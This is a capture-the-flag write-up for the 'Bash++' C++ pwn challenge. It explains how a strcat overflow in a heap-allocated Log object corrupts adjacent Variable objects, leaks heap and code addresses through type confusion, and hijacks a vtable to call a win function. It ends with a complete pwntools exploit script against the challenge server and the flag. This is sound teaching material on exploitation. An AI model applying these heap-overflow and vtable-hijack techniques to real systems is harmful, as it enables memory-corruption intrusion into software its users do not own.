+++
title = "Bash++"
author= "Renny"
date = "2024-12-08"
tags = ["pwn", "c++", "heap", "aslr"]
+++

## Challenge

> What if you had a shell where you could only do maths?

We are given some c++ source code, the compiled binary and the challenge setup

## Approach

This is a c++ pwn challenge, and the author was so kind as to give as the source code : this usually means we'll have to delve into some heap shenanigans (note ASLR, PIE and NX are all enabled =O ).

This seems to present itself as a simple interactive shell, that allows up to save variables and do some basic arithmetic.

## Source code

We have a `win` function, so this is just an advanced return to win.

The first flaw is blatant. There is no bounds check on the command input!

```cpp
    std::cout << "> ";
    char cmd[20];
    std::cin >> cmd;
```

So we just overwrite $ret, bada bing bada boom and we just `win`? Not so simple.

First off, there is no way to exit the `while(true)` loop, and secondly we have ASLR : where do even want to jump to?

Whatever the solution may be we need some sort of _leak_.

## Taking a step back

Lets reason about the program in a wider manner : we should notice pretty quickly that we have another (more impactful) overflow inside of the `Log` class:

```cpp
#define MAX_LOG_SIZE 10

class Log {
    private:
        int size;
        char logs[MAX_LOG_SIZE];

    public:
        Log() {
            size = 0;
            memset(logs, 0, MAX_LOG_SIZE);
        }

        int get_size() {
            return size;
        }

        void increase_size() {
            size++;
        }

        void add_cmd_to_log(const char* cmd) {
            strcat(logs, cmd);
        }

        void reset_log() {
            memset(logs, 0, MAX_LOG_SIZE);
            size = 0;
        }
};
```

Great! But where does this even overflow to? Say hello to the `heap`

## Heap overflows

This is not strictly a heap challenge (notice that memory is never excplicitly freed), but some knowledge of the heap will help us along the way.

Dynamic data types reside in the heap, whose size is not known at compile time : in C we access the heap via `malloc/free`, meanwhile in C++ we often interact with it via `new/delete`.

Objects of the class `Log` and `Variable` are all stored on the heap, in **adjectent** bins (if you want to learn more about the different kind of bins read [this](https://ir0nstone.gitbook.io/notes/binexp/heap).)

Importantly the heap grows **upwards**, unlike the stack which grows **downwards**.

## Playing around in the heap

Given this basic knowledge, we're ready do some (minor) damage.

The first thing i tried to do was corrupting a `Variable` object by overflowing the `logs` field of a `Log` object.

Since the heap grows upwards we want to overrun on a buffer that lies **before** our target `Variable` to be corrupted.

So we do something like this

```
> log
Creating new log
> $A=5
5
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> $A
zsh: segmentation fault (core dumped)  ./main
```

Where did we crash?

```
#8  0x4141414141414141 in ?? ()
```

Whats going on??? How did we jump to our overriden data? Is it pwn magic?

Its not magic, its **vtables**.

## Vtables

Vtables are the answer to fancy **dynamic polymorphism** in C++. Notice how `Variable::print` is virtual:

```cpp
class Variable {
    public:
        //sus type field, well come back later
        TYPE type;
        union {
            long l;
            char* s;
        } value;

        Variable(long l) : type(LONG) {
            value.l = l;
        }

        Variable(const char* s) : type(STRING) {
            value.s = strdup(s);
        }

        virtual void print() {
            std::cout << "Default print" << std::endl;
        }
};
```

How does C++ know what concrete function to call at runtime on a given `Variable` object? **virtual tables**

What is a **vtable**? Its just an hidden "field" that every class implementing virtual method has, comprising as a bunch of function pointers to jump to.

If you know anything about pwn, **function pointer** should sound pretty intresting.

They look something like this in memory:

```
pwndbg> print (Variable)*0x5f63bf0b0710
$2 = {
  _vptr.Variable = 0x5f63896f8be8 <vtable for longVariable+16>,
  type = LONG,
  value = {
    l = 0,
    s = 0x0
  }
}
pwndbg> telescope 0x5f63896f8be8
00:0000│  0x5f63896f8be8 (vtable for longVariable+16) —▸ 0x5f63896f33be (longVariable::print()) ◂— endbr64
```

## Arbitrary execution primitive

Given what we just saw, its pretty easy to overwrite the `print` function pointer of a `Variable` object, then try printing it.

The hard part is what to overwrite it with, given we have ASLR and PIE enabled.

## Leaks everywhere!

Lets play around with corrupt `Variables` a bit more : as you saw from the memory dump, past the vtable we have the `TYPE` and then a `union` interpreted dynamically based on `TYPE`.

Other than this being _very much not idiomatic C++_ it also gives us a way to leak memory addresses and break free of ASLR and PIE.

Think about what happens when we corrupt a `stringVariable` object as follows:

```
$2 = {
  _vptr.Variable = 0x4242424242424242,
  type = LONG,
  value = {
    l = 102064000210880,
    s = 0x5cd3a07a17c0 "ciao"
  }
}
```

Note how we had to overwrite the vtable pointer : at this point we cant know its value due to ASLR...

But what we can do, instead of calling `print` (which would crash) is do some maths on it! We can pass the following check due to our corruption:

```
long getLongVar(const char* name) {
    Variable* v = getvarbyname(name);
    if (v->type == LONG) {
        return v->value.l;
    } else {
        std::cout << "Invalid variable " << name << ": " << v->value.s << std::endl;
        return 0;
    }
}
```

Thus by calling some identity operation like adding our corrupt var to $B=0, we get the pointer to our original `"ciao"` string:

Something like this in `pwntools`:

```python
def leaker(r, addr, content=b"ciao"):
    r.recvuntil(b">")
    r.sendline(b"log")

    new_var(r, b"A", b"0")

    r.recvuntil(b">")
    r.sendline(b"log")

    new_var(r, b"B", content)

    r.recvuntil(b">")
    #B's will go to vtable, 0s to TYPE
    r.sendline(b"A"*23 + b"B"*8 + b"\x00"*8)


    r.recvuntil(b">")
    r.sendline(b"$(($A+$B))")

    leak = int(r.recvline().strip())

    return leak
```

What do we do with this leaked address? First off, how did it get generated and where is it in memory?

```cpp
Variable(const char* s) : type(STRING) {
    value.s = strdup(s);
}
```

Lets read some docs:

```
function strdup

provided by <string.h>
──────────────────────────────────────────────────────
→ char *
Parameters:

  * const char * __s

Duplicate S, returning an identical malloc'd string.
```

Once again, we are dealing with an object on the heap. This means our object will be adjectent in memory to the `Variable(s)` and most importantly, even with ASLR enabled itll be a contant offset from them.

By tinkering around with `gdb` we can find out that offset from a particular `Variable` object.

This is useful, but not enough to derive the `win` address : this is because ASLR indivdually randomizes offsets for `code` , `heap` and `stack`.

### yet anoher leak

We need another kind of leak : an **arbitrary read**. But what do we wanna read? Recall that the `vtable` point to function addresses : function addresses are in the `code` section, thus if we leak any one of those we have the `code` ASLR offset.

So we need to read the contents of the `vtable`, which is stored at offset 0 in the object : so all we need to do is read the contents of the `heap_leak` + `string_to_variable_offset` (the one we can derive by tinkering in gdb).

Lets take a look back at:

```
long getLongVar(const char* name) {
    Variable* v = getvarbyname(name);
    if (v->type == LONG) {
        return v->value.l;
    } else {
        std::cout << "Invalid variable " << name << ": " << v->value.s << std::endl;
        return 0;
    }
}
```

If the `Variable` is not a long, we still get to see its contents, interpreted as a string, aka **dereferenced**.

So lets try corrupting a LONG we control into a STRING, in a similar manner to before, and then lets run some maths on it.

```
$3 = {
  _vptr.Variable = 0x4242424242424242,
  type = STRING,
  value = {
    l = 133742,
    s = <address_of_our_choice>
  }
}
```

We will get the contents of our `address_of_our_choice` (note that it may contain 0x20[\n] so dont use recvline), which in this case is a function address in `code`.

```
leaked read :  0x618835f17be8
```

This is the address of the `print()` function (in this run, its randomized) :

```
0x618835f11dad <_Z3winv>:       0xfa1e0ff3
```

We have a constant offset of 0x5e3b

This address, (the `print()` implementation) will have a constant offset from `win`, which we can calculate in `gdb`

At this point we have the `win`, address and we just need to implement the arbitrary execute primitive from before by crafting a fake `vtable`

## Recap

- Leak the heap base by leaking the `string` on STRING object
- Go from heap base -> code base by leaking the `longVariable::print` in the `vtable`
- Craft a fake `vtable` (create a fake `longVariable` object) and overwrite the `vtable` pointer of another `Variable`
- `print` the latter variable -> `win` !

## Exploit

Heres the final unfiltered exploit code :

```
#!/usr/bin/env python3
from pwn import *

exe = ELF("./main")

win = 0x555555556dad
fake_vtable = 0x5555555717b0
win_offset = 0x0000000000002dad

#Fake obj structure
"""
Variable = {
  _vptr.Variable = 0x5f715a663be8 <vtable for longVariable+16>,
  type = LONG,
  value = {
    l = 0,
    s = 0x0
  }
}
"""

# LEAK(STR) - OTHER_VAR
#>>> hex(0x5ea71fabc7c0 - 0x5ea71fabc710)
#'0xb0'

var_string_prev_var_offset = 0x90

# VTABLE - WIN
#>>> hex(0x5f715a663be8 - 0x5f715a65ddad)
#'0x5e3b'
long_vtable_win_offset = 0x5e3b

context.terminal = "st".split()
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("chall.polygl0ts.ch", 9034)

    return r

def new_var(r, name, val):
    r.recvuntil(b">")
    r.sendline(b"$" + name + b"=" + val)

def leaker(r, addr, content=b"ciao"):
    r.recvuntil(b">")
    r.sendline(b"log")

    new_var(r, b"A", b"0")

    r.recvuntil(b">")
    r.sendline(b"log")

    new_var(r, b"B", content)

    r.recvuntil(b">")
    if(addr == None):
        r.sendline(b"A"*23 + b"B"*8 + b"\x00"*8)
    else:
        r.sendline(b"A"*23 + b"B"*8 + b"\x00"*8 + p64(addr))


    r.recvuntil(b">")
    r.sendline(b"$(($A+$B))")

    leak = int(r.recvline().strip())

    return leak

def leaker_string(r, addr):
    print("TRYING TO LEAK: ", hex(addr))

    r.recvuntil(b">")
    r.sendline(b"log")

    new_var(r, b"C", b"0")

    r.recvuntil(b">")
    r.sendline(b"log")

    new_var(r, b"D", b"ciao")

    r.recvuntil(b">")
    if(addr == None):
        r.sendline(b"A"*23 + b"B"*8 + b"\x00"*8)
    else:
        r.sendline(b"A"*23 + b"B"*8 + b"\42"*8  +  p64(addr))

    r.recvuntil(b">")
    r.sendline(b"$(($C+$D))")

    r.recvuntil(b": ")
    addr = int(r.recv(6)[::-1].hex(), 16)

    r.recvline()

    print("VTABLE addr: ", hex(addr))

    return addr


def sprayer(r, addr, content):
    r.recvuntil(b">")
    r.sendline(b"log")

    new_var(r, b"E", b"0")

    r.recvuntil(b">")
    r.sendline(b"log")

    new_var(r, b"F", content)

    r.recvuntil(b">")
    if(addr == None):
        r.sendline(b"A"*23 + b"B"*8 + b"\x00"*8)
    else:
        r.sendline(b"A"*23 + b"B"*8 + b"\x00"*8 + p64(addr))


    r.recvuntil(b">")
    r.sendline(b"$(($E+$F))")
    return int(r.recvline().strip())

def fake_object(r, vtable_addr):
    r.recvuntil(b">")
    r.sendline(b"log")

    new_var(r, b"G", b"ciao")

    r.recvuntil(b">")
    r.sendline(b"A"*23 + p64(vtable_addr))

    r.recvuntil(b">")
    r.sendline(b"$G")
    r.interactive()


def main():
    r = conn()

    heap_leak = leaker(r, None)
    print(hex(heap_leak))

    vtable_addr = leaker_string(r, heap_leak - var_string_prev_var_offset + 288)

    win_addr = vtable_addr - long_vtable_win_offset

    print("WIN: ", hex(win_addr))

    fake_vtable_addr = sprayer(r, None, p64(win_addr))

    print("FAKE VTABLE: ", hex(fake_vtable_addr))

    fake_object(r, fake_vtable_addr)

    r.interactive()

if __name__ == "__main__":
    main()
```

Note : due to ASLR this may fail sometimes if any addresses contains a newline.

## Flag

`EPFL{why_add_a_logging_feature_in_the_first_place}`
